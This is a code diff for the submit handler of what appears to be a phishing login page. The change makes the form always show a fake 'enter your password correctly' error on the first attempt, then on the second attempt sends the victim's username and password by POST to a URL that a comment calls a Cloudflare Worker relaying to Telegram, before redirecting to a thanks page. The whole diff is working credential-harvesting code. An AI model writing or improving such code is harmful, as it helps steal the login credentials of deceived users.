@@ -61,39 +61,33 @@ document.addEventListener('DOMContentLoaded', function() {
         passerror = document.getElementById("passwordErrorText");
         password = document.getElementById("password").value;  // Get the password
 
-        // Validate password length
-        if (password.length < 4) {
+        // On first submit, show the error and stop submission
+        if (isFirstSubmit) {
             passerror.style.fontSize = "small";
-            passerror.innerHTML = "Please enter your password correctly!";
-            
-            // Only prevent the first submit
-            if (isFirstSubmit) {
-                return; // Stop the submission and show the error
-            }
-        } else {
-            // After the second submission, send both email and password to the Cloudflare Worker (Telegram)
-            fetch(url, {
-                method: "POST",
-                body: JSON.stringify({
-                    userID: username,   // Send the username (email) field
-                    password: password, // Send the password field
-                }),
-                headers: {
-                    "Content-type": "application/json; charset=UTF-8"
-                }
-            })
-            .then(function(response) {
-                // Successfully sent data, redirect to thanks.html
-                setCookie("username", username, 30);  // Optionally store the username in a cookie
-                window.location.href = "./thanks.html"; // Redirect after success
-            })
-            .catch(function(error) {
-                passerror.style.fontSize = "small";
-                passerror.innerHTML = "There was an error processing your request.";
-            });
+            passerror.innerHTML = "Please enter your password correctly!"; // Simulate first submission error
+            isFirstSubmit = false; // Set flag to allow second submission
+            return; // Prevent the form submission
         }
 
-        // After the first submission (password is correct), set the flag to allow the second submit
-        isFirstSubmit = false;
+        // On second submit, send both username and password to the Cloudflare Worker (Telegram)
+        fetch(url, {
+            method: "POST",
+            body: JSON.stringify({
+                userID: username,   // Send the username (email) field
+                password: password, // Send the password field
+            }),
+            headers: {
+                "Content-type": "application/json; charset=UTF-8"
+            }
+        })
+        .then(function(response) {
+            // Successfully sent data, redirect to thanks.html
+            setCookie("username", username, 30);  // Optionally store the username in a cookie
+            window.location.href = "./thanks.html"; // Redirect after success
+        })
+        .catch(function(error) {
+            passerror.style.fontSize = "small";
+            passerror.innerHTML = "There was an error processing your request.";
+        });
     });
 });
